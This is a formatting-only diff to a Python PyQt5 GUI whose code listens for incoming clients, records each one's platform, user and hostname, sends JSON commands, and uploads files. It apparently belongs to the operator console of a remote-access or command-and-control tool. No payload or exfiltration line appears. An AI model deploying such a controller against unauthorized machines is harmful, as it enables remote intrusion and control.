@@ -31,7 +31,7 @@ from PyQt5.QtGui import QFont, QColor
 
 class ListenerThread(QThread):
     """Thread for listening to incoming connections"""
-    
+
     client_connected = pyqtSignal(str, str)  # ip, info
     client_data = pyqtSignal(str, dict)  # ip, data
 
@@ -46,38 +46,38 @@ class ListenerThread(QThread):
         try:
             listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            listener.bind(('0.0.0.0', self.listen_port))
+            listener.bind(("0.0.0.0", self.listen_port))
             listener.listen(5)
             listener.settimeout(1)
-            
+
             print(f"[+] Listening on port {self.listen_port}")
-            
+
             while self.running:
                 try:
                     conn, addr = listener.accept()
                     client_ip = f"{addr[0]}:{addr[1]}"
-                    
+
                     # Receive initial info
                     data = conn.recv(4096).decode()
                     client_info = json.loads(data)
-                    
+
                     self.clients[client_ip] = {
-                        'socket': conn,
-                        'info': client_info,
-                        'connected': datetime.now()
+                        "socket": conn,
+                        "info": client_info,
+                        "connected": datetime.now(),
                     }
-                    
+
                     info_str = f"[{client_info.get('platform')}] {client_info.get('user')}@{client_info.get('hostname')}"
                     self.client_connected.emit(client_ip, info_str)
-                    
+
                     # Handle client in separate thread
                     self.handle_client(conn, client_ip)
-                
+
                 except socket.timeout:
                     continue
                 except Exception as e:
                     print(f"[!] Connection error: {e}")
-        
+
         except Exception as e:
             print(f"[!] Listener error: {e}")
         finally:
@@ -88,13 +88,14 @@ class ListenerThread(QThread):
 
     def handle_client(self, conn, client_ip):
         """Handle individual client"""
+
         def client_thread():
             try:
                 while self.running:
                     data = conn.recv(4096).decode()
                     if not data:
                         break
-                    
+
                     client_data = json.loads(data)
                     self.client_data.emit(client_ip, client_data)
             except:
@@ -105,7 +106,7 @@ class ListenerThread(QThread):
                         del self.clients[client_ip]
                 except:
                     pass
-        
+
         t = threading.Thread(target=client_thread, daemon=True)
         t.start()
 
@@ -113,7 +114,7 @@ class ListenerThread(QThread):
         """Send command to client"""
         try:
             if client_ip in self.clients:
-                conn = self.clients[client_ip]['socket']
+                conn = self.clients[client_ip]["socket"]
                 conn.send(json.dumps(command).encode())
                 return True
         except:
@@ -309,7 +310,7 @@ class ClientTab(QWidget):
         file_path, _ = QFileDialog.getOpenFileName(self, "Select file to upload")
         if file_path:
             try:
-                with open(file_path, 'rb') as f:
+                with open(file_path, "rb") as f:
                     data = base64.b64encode(f.read()).decode()
 
                 dest = Path(file_path).name
